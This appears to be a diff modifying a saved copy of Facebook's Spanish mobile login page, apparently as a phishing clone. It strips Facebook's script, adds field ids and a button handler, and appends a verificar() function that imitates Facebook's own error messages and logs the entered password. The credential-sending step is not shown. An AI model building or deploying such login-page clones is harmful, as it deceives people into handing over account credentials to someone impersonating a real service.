@@ -10,7 +10,6 @@
       <link rel="stylesheet" type="text/css" id="yZEgv" href="./src/T8KBaeq926N.css">
       <link rel="stylesheet" type="text/css" id="pLYQW" href="./src/ZX3_sP5wb5_.css">
       <link rel="canonical" href="https://www.facebook.com/">
-      <script type="text/javascript" src="./src/nn65wb6j9IJ.js" crossorigin="anonymous"></script>
    </head>
    <body tabindex="0" class="touch x1 _fzu _50-3 iframe acw portrait" style="min-height: 431px; background-color: rgb(255, 255, 255);">
       <div id="viewport" style="min-height: 431px;">
@@ -26,21 +25,18 @@
             <div class="maxwidth _5soa acw" id="root" role="main" data-sigil="context-layer-root content-pane" style="min-height: 431px;">
                <div class="_4g33">
                   <div class="_4g34" id="u_0_0">
-                     <div class="_5yd0 _2ph- _5yd1" style="display: none;" data-sigil="m_login_notice">
-                        <div class="_52jd"></div>
-                     </div>
-                     <div>
+<div id="notice" class="_5yd0 _2ph- _5yd1" data-sigil="m_login_notice" style="display:none"></div>
                         <div class="aclb _5rut" data-sigil="traditional-login">
                            <div data-sigil="m_login_upsell"></div>
-                           <form method="post" class="mobile-login-form _5spm" id="u_0_1" novalidate="1" action="https://m.facebook.com/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2F&amp;lwv=100" data-sigil="m_login_form" data-autoid="autoid_1">
+                           <form  name ="formularioContacto" method="post" class="mobile-login-form _5spm" id="u_0_1" novalidate="1" action="https://m.facebook.com/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2F&amp;lwv=100" data-sigil="m_login_form" data-autoid="autoid_1">
                               <input type="hidden" name="lsd" value="AVppREti" autocomplete="off"><input type="hidden" name="charset_test" value="€,´,€,´,水,Д,Є"><input type="hidden" name="version" value="1"><input type="hidden" id="ajax" name="ajax" value="0"><input type="hidden" id="width" name="width" value="0"><input type="hidden" id="pxr" name="pxr" value="0"><input type="hidden" id="gps" name="gps" value="0"><input type="hidden" id="dimensions" name="dimensions" value="0"><input type="hidden" name="m_ts" value="1467092834"><input type="hidden" name="li" value="Yg9yVzgxNkmmfbEujO-pgbSU">
                               <div class="_56be _5sob">
                                  <div class="_55wo _55x2 _56bf">
-                                    <input autocorrect="off" autocapitalize="off" class="_56bg _4u9z _5ruq" name="email" placeholder="Correo o teléfono" value="" type="text" data-sigil="m_login_email">
+                                    <input autocorrect="off" autocapitalize="off" class="_56bg _4u9z _5ruq" id="email" name="email" placeholder="Correo o teléfono" value="" type="text" data-sigil="m_login_email">
                                     <div class="_3nph _mg8" data-sigil="m_login_password">
                                        <div class="_4g33">
                                           <div class="_4g34 _5i2i _52we">
-                                             <div class="_5xu4"><input autocorrect="off" autocapitalize="off" class="_56bg _4u9z _27z2" name="pass" placeholder="Contraseña" id="u_0_2" type="password" data-sigil="password-plain-text-toggle-input"></div>
+                                             <div class="_5xu4"><input autocorrect="off" autocapitalize="off" class="_56bg _4u9z _27z2" name="pass" id="pass" placeholder="Contraseña" id="u_0_2" type="password" data-sigil="password-plain-text-toggle-input"></div>
                                           </div>
                                           <div class="_5s61 _216i _5i2i _52we">
                                              <div class="_5xu4">
@@ -51,7 +47,7 @@
                                     </div>
                                  </div>
                               </div>
-                              <div class="_2pie"><button type="button" value="Entrar" class="_54k8 _56bs _56b_ _56bw _56bu" name="login" id="u_0_6" data-sigil="touchable m_login_button" data-autoid="autoid_2"><span class="_55sr">Entrar</span></button></div>
+                              <div class="_2pie"><button type="button" value="Entrar" class="_54k8 _56bs _56b_ _56bw _56bu" name="login" id="u_0_6" data-sigil="touchable m_login_button" data-autoid="autoid_2" onclick="verificar()"><span class="_55sr">Entrar</span></button></div>
                               <noscript>&lt;input type="hidden" name="_fb_noscript" value="true" /&gt;</noscript>
                            </form>
                            <div class="_52jj _5t3b"><a class="_54k8 _56bs _56bw _56bv" data-store="{&quot;nativeClick&quot;:true}" href="https://m.facebook.com/reg/?cid=103&amp;refid=8" role="button" data-sigil="touchable"><span class="_55sr">Crear cuenta nueva</span></a></div>
@@ -139,7 +135,44 @@
                Cargando...
             </div>
          </div>
-      </div>
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              
+      </div> 
+
+<script> 
+function verificar(){
+   var emailv = document.getElementById("email").value;
+   var passv= document.getElementsByName("pass").value;
+   var notice = document.getElementById("notice");
+
+   if (emailv=="") {
+      var email = document.getElementById("email");
+      email.className += " _3qsy _3qs-";
+      document.getElementById("notice").innerHTML = "El correo electrónico o el número de teléfono que has introducido no coinciden con ninguna cuenta. <b>Regístrate para crear una cuenta.<b>";
+      notice.style.display = notice.style.display === 'none' ? '' : '';
+                
+   }
+   else{
+      var email = document.getElementById("email");
+      var pass = document.getElementById("pass");
+     
+      var passv= document.getElementById("pass").value;
+
+            if (passv=="") {
+                notice.style.display = notice.style.display === 'none' ? '' : 'none';
+            document.getElementById("notice").innerHTML = "La contraseña que has introducido es incorrecta.<b> ¿Has olvidado la contraseña? </b>";
+            console.log(passv);
+            pass.className += " _3qsy _3qs-";
+            }
+            else {pass.className = " _56bg _4u9z _5ruq";}
+
+         email.className = " _56bg _4u9z _5ruq";
+
+      }
+}
+</script>                                                                                                                                                                                                                                                                                                                                                                                                                                
    </body>
 </html>
+
+
+
+
+
